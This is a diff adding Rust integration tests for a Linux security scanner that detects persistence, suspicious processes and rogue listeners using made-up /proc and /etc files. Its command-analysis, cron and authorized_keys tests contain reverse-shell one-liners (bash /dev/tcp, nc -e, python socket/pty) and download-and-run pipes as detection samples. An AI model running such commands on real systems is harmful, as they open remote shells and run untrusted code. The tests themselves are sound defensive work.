@@ -1,0 +1,341 @@
+//! Integration tests with made-up /proc, /etc and systemd files in a
+//! temporary directory (tempfile). Nothing on the real system is read or changed.
+
+use scanner::baseline::{self, Baseline};
+use scanner::config::{glob_match, Config};
+use scanner::external_tools::{parse_chkrootkit, parse_debsums, parse_lynis, parse_rkhunter};
+use scanner::modules::common::analyze_command;
+use scanner::modules::net_proc::{encode_hex_addr, parse_hex_addr, parse_proc_net, parse_sched_debug, parse_ss_listeners, Proto};
+use scanner::modules::persistence::{parse_authorized_key, parse_cron_line, parse_pam_line, parse_unit};
+use scanner::modules::{fs_perms, proc_audit, Collector, ScanCtx};
+use scanner::procinfo::{parse_stat, read_proc, snapshot};
+use scanner::sandbox;
+use scanner::{run_scan, ModuleId, ScanOptions, Severity, SysRoot};
+use std::fs;
+use std::net::SocketAddr;
+use std::os::unix::fs::{symlink, PermissionsExt};
+use std::path::Path;
+
+fn write(root: &Path, abs: &str, content: &str) {
+    let p = root.join(abs.trim_start_matches('/'));
+    fs::create_dir_all(p.parent().expect("parent")).expect("mkdir");
+    fs::write(p, content).expect("write");
+}
+
+fn opts(modules: &[ModuleId]) -> ScanOptions {
+    ScanOptions { modules: modules.to_vec(), ..ScanOptions::default() }
+}
+
+// ------------------------------------------------------------ /proc/net/tcp
+
+#[test]
+fn hex_addresses_round_trip_ipv4_and_ipv6() {
+    for s in ["127.0.0.1:53", "10.0.0.5:4444", "0.0.0.0:0", "[::1]:631", "[2001:db8::42]:443", "[::ffff:192.0.2.1]:22"] {
+        let a: SocketAddr = s.parse().expect("address");
+        let v6 = matches!(a, SocketAddr::V6(_));
+        assert_eq!(parse_hex_addr(&encode_hex_addr(&a), v6).expect("parse"), a, "{s}");
+    }
+}
+
+#[test]
+fn parses_kernel_style_proc_net_tcp() {
+    // This is what loopback DNS looks like in a real /proc/net/tcp on x86_64 (little endian)
+    let text = "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n\
+   0: 3500007F:0035 00000000:0000 0A 00000000:00000000 00:00000000 00000000   991        0 21345 1 0000000000000000 100 0 0 10 5\n\
+   1: 0500000A:A8CA 42710FCB:115C 01 00000000:00000000 02:000A7D9A 00000000  1000        0 99887 2 0000000000000000 20 4 30 10 -1\n\
+   2: broken line\n";
+    let (entries, bad) = parse_proc_net(text, Proto::Tcp);
+    assert_eq!(bad, 1, "the broken line should be counted, not crash");
+    assert_eq!(entries.len(), 2);
+    assert_eq!(entries[0].local.to_string(), "127.0.0.53:53");
+    assert!(entries[0].is_listening());
+    assert_eq!(entries[0].uid, 991);
+    assert_eq!(entries[1].local.to_string(), "10.0.0.5:43210");
+    assert_eq!(entries[1].remote.to_string(), "203.15.113.66:4444");
+    assert_eq!(entries[1].remote.port(), 4444);
+    assert!(entries[1].is_established());
+    assert_eq!(entries[1].inode, 99887);
+}
+
+#[test]
+fn parses_ipv6_listener() {
+    let text = "header\n   0: 00000000000000000000000000000000:0016 00000000000000000000000000000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 1234 1 0 100 0 0 10 0\n";
+    let (e, bad) = parse_proc_net(text, Proto::Tcp6);
+    assert_eq!(bad, 0);
+    assert_eq!(e[0].local.to_string(), "[::]:22");
+}
+
+#[test]
+fn parses_sched_debug_and_ss() {
+    let sched = "cpu#0\nrunnable tasks:\n S task PID tree-key switches prio\n------\n S   systemd     1   1234.567  5000  120  0.0  1.0\n>R   my prog   4101   22.5   3  120  0.0  1.0\n";
+    let pids = parse_sched_debug(sched);
+    assert!(pids.contains(&1) && pids.contains(&4101), "{pids:?}");
+    let ss = "tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*\nudp   UNCONN 0      0      127.0.0.53%lo:53         0.0.0.0:*\n";
+    let set = parse_ss_listeners(ss);
+    assert!(set.contains(&("tcp".into(), 22)) && set.contains(&("udp".into(), 53)));
+}
+
+// ------------------------------------------------------------ processes
+
+#[test]
+fn stat_with_spaces_and_parens_in_name() {
+    let (comm, state, ppid, flags) = parse_stat("4242 (evil (x) name) S 1 4242 4242 0 -1 2097152 0 0").expect("stat");
+    assert_eq!(comm, "evil (x) name");
+    assert_eq!(state, 'S');
+    assert_eq!(ppid, 1);
+    assert_eq!(flags, 0x0020_0000);
+}
+
+#[test]
+fn detects_deleted_binary_and_tmp_exe() {
+    let dir = tempfile::tempdir().expect("tempdir");
+    let root = dir.path();
+    write(root, "/proc/77/stat", "77 (x) S 1 77 77 0 -1 0 0 0\n");
+    write(root, "/proc/77/status", "Name:\tx\nTgid:\t77\nPPid:\t1\nUid:\t0\t0\t0\t0\n");
+    write(root, "/proc/77/cmdline", "/tmp/x\0");
+    symlink("/tmp/x (deleted)", root.join("proc/77/exe")).expect("symlink");
+    fs::create_dir_all(root.join("proc/77/fd")).expect("fd");
+    symlink("socket:[555]", root.join("proc/77/fd/3")).expect("fd link");
+
+    let sys = SysRoot::new(root);
+    let p = read_proc(&sys, 77).expect("process");
+    assert!(p.exe_deleted());
+    assert_eq!(p.exe_path(), Some("/tmp/x"));
+    assert_eq!(p.socket_fds, vec![(3, 555)]);
+
+    let cfg = Config::default();
+    let procs = snapshot(&sys);
+    let ctx = ScanCtx { sys: &sys, cfg: &cfg, deep_pid_scan: false, privileged: true, processes: &procs };
+    let mut col = Collector::default();
+    proc_audit::run(&ctx, &mut col);
+    let rules: Vec<&str> = col.findings.iter().map(|f| f.rule.as_str()).collect();
+    assert!(rules.contains(&"PROC-DELETED"), "{rules:?}");
+    assert!(rules.contains(&"PROC-TMP-EXE"), "{rules:?}");
+    let deleted = col.findings.iter().find(|f| f.rule == "PROC-DELETED").expect("finding");
+    assert_eq!(deleted.severity, Severity::High);
+}
+
+#[test]
+fn missing_proc_files_never_panic() {
+    let dir = tempfile::tempdir().expect("tempdir");
+    // A completely empty root: no /proc files at all
+    let sys = SysRoot::new(dir.path());
+    let report = run_scan(&sys, &Config::default(), &ScanOptions::default(), &|_| {});
+    assert!(report.notes.iter().any(|n| n.contains("/proc/net/tcp")), "{:?}", report.notes);
+    assert_eq!(report.summary.critical, 0);
+}
+
+// ------------------------------------------------------------ SUID and baseline
+
+#[test]
+fn suid_diff_flags_new_file_as_critical() {
+    let dir = tempfile::tempdir().expect("tempdir");
+    let root = dir.path();
+    write(root, "/usr/bin/passwd", "x");
+    fs::set_permissions(root.join("usr/bin/passwd"), fs::Permissions::from_mode(0o4755)).expect("chmod");
+
+    let sys = SysRoot::new(root);
+    let cfg = Config::default();
+    let first = run_scan(&sys, &cfg, &opts(&[ModuleId::FsPerms]), &|_| {});
+    assert_eq!(first.inventory.suid.len(), 1);
+    assert!(first.findings.iter().all(|f| f.severity < Severity::Critical));
+    let base_path = dir.path().join("baseline.json");
+    Baseline::from_report(&first).save(&base_path).expect("save");
+
+    // new SUID file and changed content in the old one
+    write(root, "/usr/local/bin/backdoor", "y");
+    fs::set_permissions(root.join("usr/local/bin/backdoor"), fs::Permissions::from_mode(0o4755)).expect("chmod");
+    write(root, "/usr/bin/passwd", "changed");
+    fs::set_permissions(root.join("usr/bin/passwd"), fs::Permissions::from_mode(0o4755)).expect("chmod");
+
+    let o = ScanOptions { baseline_compare: Some(base_path), ..opts(&[ModuleId::FsPerms]) };
+    let second = run_scan(&sys, &cfg, &o, &|_| {});
+    let new = second.findings.iter().find(|f| f.rule == "BASE-SUID-NEW").expect("new SUID file");
+    assert_eq!(new.severity, Severity::Critical);
+    assert!(new.title.contains("/usr/local/bin/backdoor"));
+    assert!(second.has_rule("BASE-SUID-CHANGED"));
+    assert_eq!(second.findings[0].severity, Severity::Critical, "the report should be sorted with Critical first");
+}
+
+#[test]
+fn baseline_compare_skips_modules_not_scanned() {
+    let b = Baseline {
+        format_version: 1,
+        created_at: "then".into(),
+        hostname: "h".into(),
+        kernel: "k".into(),
+        os: "o".into(),
+        scanner_version: "0".into(),
+        modules: vec!["persistence".into()],
+        suid: vec![],
+        listeners: vec![],
+        persistence_files: Default::default(),
+    };
+    let (f, notes) = baseline::compare(&b, &Default::default(), &["fs_perms".to_string()]);
+    assert!(f.is_empty());
+    assert!(notes.iter().any(|n| n.contains("SUID")));
+}
+
+#[test]
+fn fs_walk_skips_virtual_paths() {
+    let dir = tempfile::tempdir().expect("tempdir");
+    let root = dir.path();
+    write(root, "/proc/1/fake", "x");
+    fs::set_permissions(root.join("proc/1/fake"), fs::Permissions::from_mode(0o4755)).expect("chmod");
+    let sys = SysRoot::new(root);
+    let cfg = Config::default();
+    let ctx = ScanCtx { sys: &sys, cfg: &cfg, deep_pid_scan: false, privileged: true, processes: &[] };
+    let mut col = Collector::default();
+    fs_perms::run(&ctx, &mut col);
+    assert!(col.inventory.suid.is_empty(), "/proc should be skipped");
+}
+
+// ------------------------------------------------------------ systemd, cron, ssh, pam
+
+#[test]
+fn systemd_unit_with_tmp_exec_is_flagged() {
+    let dir = tempfile::tempdir().expect("tempdir");
+    let root = dir.path();
+    write(root, "/etc/systemd/system/dummy.service", "[Service]\nExecStart=-/dev/shm/.x \\\n  --daemon\n");
+    symlink("../dummy.service", {
+        fs::create_dir_all(root.join("etc/systemd/system/multi-user.target.wants")).expect("mkdir");
+        root.join("etc/systemd/system/multi-user.target.wants/dummy.service")
+    })
+    .expect("symlink");
+    let report = run_scan(&SysRoot::new(root), &Config::default(), &opts(&[ModuleId::Persistence]), &|_| {});
+    let f = report.findings.iter().find(|f| f.rule == "PERS-SYSTEMD-EXEC").expect("finding");
+    assert_eq!(f.severity, Severity::Critical);
+    assert!(f.evidence.contains("enabled"));
+    assert!(report.inventory.units.iter().any(|u| u.name == "dummy.service" && u.enabled));
+}
+
+#[test]
+fn unit_parser_handles_continuations() {
+    let e = parse_unit("[Service]\n# kommentar\nExecStart=/bin/echo a \\\n  b\nUser=nobody\n");
+    assert_eq!(e[0], ("Service".into(), "ExecStart".into(), "/bin/echo a    b".into()));
+    assert_eq!(e[1].1, "User");
+}
+
+#[test]
+fn cron_lines() {
+    assert_eq!(parse_cron_line("MAILTO=root", true), None);
+    let (s, u, c) = parse_cron_line("*/5 * * * * root curl x | sh", true).expect("line");
+    assert_eq!((s.as_str(), u.as_deref(), c.as_str()), ("*/5 * * * *", Some("root"), "curl x | sh"));
+    let (s, u, c) = parse_cron_line("@reboot /home/a/.x", false).expect("line");
+    assert_eq!((s.as_str(), u, c.as_str()), ("@reboot", None, "/home/a/.x"));
+}
+
+#[test]
+fn command_analysis() {
+    let cfg = Config::default();
+    let sev = |c: &str| analyze_command(c, &cfg).iter().map(|i| i.severity).max();
+    assert_eq!(sev("/usr/sbin/sshd -D"), None);
+    assert_eq!(sev("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"), Some(Severity::Critical));
+    assert_eq!(sev("echo aGk= | base64 -d | sh"), Some(Severity::Critical));
+    assert_eq!(sev("wget -qO- http://x/y | bash"), Some(Severity::Critical));
+    assert_eq!(sev("/tmp/update.sh"), Some(Severity::High));
+    assert_eq!(sev("python3 -c 'import socket,pty;s=socket.socket()'"), Some(Severity::Critical));
+}
+
+#[test]
+fn authorized_keys_options_and_comment() {
+    let k = parse_authorized_key("command=\"nc -e /bin/sh 1.2.3.4 1\",no-pty ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl").expect("key");
+    assert_eq!(k.option("command"), Some("nc -e /bin/sh 1.2.3.4 1"));
+    assert!(k.has_option("no-pty"));
+    assert_eq!(k.comment, "");
+    assert!(k.fingerprint().expect("fingerprint").starts_with("SHA256:"));
+    let k2 = parse_authorized_key("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl anna@laptop").expect("key");
+    assert_eq!(k2.comment, "anna@laptop");
+    assert!(parse_authorized_key("# kommentar").is_none());
+}
+
+#[test]
+fn pam_lines() {
+    let (t, c, m, a) = parse_pam_line("auth\t[success=1 default=ignore]\tpam_unix.so nullok").expect("line");
+    assert_eq!((t.as_str(), c.as_str(), m.as_str()), ("auth", "[success=1 default=ignore]", "pam_unix.so"));
+    assert_eq!(a, vec!["nullok".to_string()]);
+    assert!(parse_pam_line("@include common-auth").is_none());
+}
+
+#[test]
+fn whitelist_glob_and_toml_round_trip() {
+    assert!(glob_match("/usr/lib/*/chrome-sandbox", "/usr/lib/app/chrome-sandbox"));
+    assert!(!glob_match("/usr/lib/*/chrome-sandbox", "/usr/lib/a/b/chrome-sandbox"));
+    let cfg = Config::default();
+    let text = cfg.to_toml().expect("toml");
+    let back: Config = toml::from_str(&text).expect("parse");
+    assert_eq!(back, cfg);
+    let partial: Config = toml::from_str("allowed_listen_ports = [\"tcp/8080\"]").expect("partial");
+    assert!(partial.is_listen_allowed("tcp", 8080));
+    assert!(!partial.allowed_suid.is_empty(), "missing fields should get default values");
+}
+
+// ------------------------------------------------------------ external tools
+
+#[test]
+fn debsums_and_friends_parse() {
+    let f = parse_debsums("/usr/bin/ls\n/usr/share/doc/x/README\n", "debsums: missing file /usr/share/man/man1/a.1.gz (from a package)\n");
+    assert_eq!(f.len(), 3);
+    assert_eq!(f[0].severity, Severity::Critical);
+    assert_eq!(f[1].severity, Severity::Low);
+    assert_eq!(f[2].rule, "EXT-DEBSUMS-MISSING");
+    assert_eq!(parse_chkrootkit("Checking `ls'... INFECTED\n")[0].severity, Severity::Critical);
+    assert_eq!(parse_rkhunter("Warning: The file properties have changed:\n         File: /usr/bin/ls\n").len(), 1);
+    assert_eq!(parse_lynis("", "warning[]=SSH-7408|Root login|\nsuggestion[]=X|y|\n").len(), 2);
+}
+
+#[test]
+fn known_debian_false_alarms_are_low() {
+    // Lines from a real root scan on Debian 13
+    let rk = parse_rkhunter("Warning: Hidden file found: /etc/.updated: ASCII text\nWarning: The command '/usr/bin/lwp-request' has been replaced by a script: /usr/bin/lwp-request: Perl script text executable\n");
+    assert_eq!(rk.len(), 2);
+    assert!(rk.iter().all(|f| f.severity == Severity::Low && f.rule == "EXT-RKHUNTER-KNOWN"), "{rk:?}");
+    let ck = parse_chkrootkit("WARNING: Output from ifpromisc:\nwlp2s0: PACKET SNIFFER(/usr/sbin/NetworkManager[1044], /usr/sbin/wpa_supplicant[1049])\nWARNING: output from chkwtmp:\n1 deletion(s) between Fri Nov  6 08:53:56 2026 and Fri Nov  6 08:55:52 2026\n");
+    assert_eq!(ck.len(), 1);
+    assert!(!ck[0].evidence.contains("SNIFFER"), "{}", ck[0].evidence);
+    assert!(ck[0].evidence.contains("chkwtmp"));
+}
+
+#[test]
+fn nfs_callback_listener_is_low_and_shared_socket_reported_once() {
+    let dir = tempfile::tempdir().expect("tempdir");
+    let root = dir.path();
+    let hdr = "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n";
+    write(
+        root,
+        "/proc/net/tcp",
+        &format!(
+            "{hdr}   0: 00000000:A873 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 23931 1 0 100 0 0 10 0\n   1: 00000000:006F 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 16439 1 0 100 0 0 10 0\n"
+        ),
+    );
+    write(root, "/proc/mounts", "fileserver:/export/data /mnt/data nfs4 rw,vers=4.0 0 0\n");
+    // the kernel thread [NFSv4 callback]
+    write(root, "/proc/3243/stat", "3243 (NFSv4 callback) S 2 0 0 0 -1 2129984 0 0\n");
+    write(root, "/proc/3243/status", "Name:\tNFSv4 callback\nTgid:\t3243\nPPid:\t2\nUid:\t0\t0\t0\t0\n");
+    // systemd (PID 1) and rpcbind share port 111 through socket activation
+    for (pid, comm, exe, uid) in [(1u32, "systemd", "/usr/lib/systemd/systemd", 0u32), (885, "rpcbind", "/usr/sbin/rpcbind", 113)] {
+        write(root, &format!("/proc/{pid}/stat"), &format!("{pid} ({comm}) S 1 0 0 0 -1 4194560 0 0\n"));
+        write(root, &format!("/proc/{pid}/status"), &format!("Name:\t{comm}\nTgid:\t{pid}\nPPid:\t1\nUid:\t{uid}\t{uid}\t{uid}\t{uid}\n"));
+        write(root, &format!("/proc/{pid}/cmdline"), &format!("{exe}\0"));
+        symlink(exe, root.join(format!("proc/{pid}/exe"))).expect("exe");
+        fs::create_dir_all(root.join(format!("proc/{pid}/fd"))).expect("fd");
+        symlink("socket:[16439]", root.join(format!("proc/{pid}/fd/5"))).expect("sock");
+    }
+    let report = run_scan(&SysRoot::new(root), &Config::default(), &opts(&[ModuleId::NetProc]), &|_| {});
+    let orphan = report.findings.iter().find(|f| f.rule == "NET-ORPHAN-LISTEN").expect("orphan");
+    assert_eq!(orphan.severity, Severity::Low, "{}", orphan.description);
+    let p111: Vec<_> = report.findings.iter().filter(|f| f.rule == "NET-LISTEN-UNKNOWN").collect();
+    assert_eq!(p111.len(), 1, "{p111:?}");
+    assert!(p111[0].title.contains("rpcbind"), "{}", p111[0].title);
+}
+
+// ------------------------------------------------------------ the whole sandbox
+
+#[test]
+fn sandbox_self_test_triggers_every_rule() {
+    let res = sandbox::run_self_test(&|_| {}).expect("self-test");
+    let failed: Vec<&str> = res.checks.iter().filter(|c| !c.passed).map(|c| c.rule.as_str()).collect();
+    assert!(failed.is_empty(), "rules that did not fire: {failed:?}");
+    assert!(res.report.findings.windows(2).all(|w| w[0].severity >= w[1].severity));
+    assert!(res.report.findings.iter().all(|f| !f.verify.is_empty() || f.rule.starts_with("EXT-")), "every finding should have verification commands");
+}
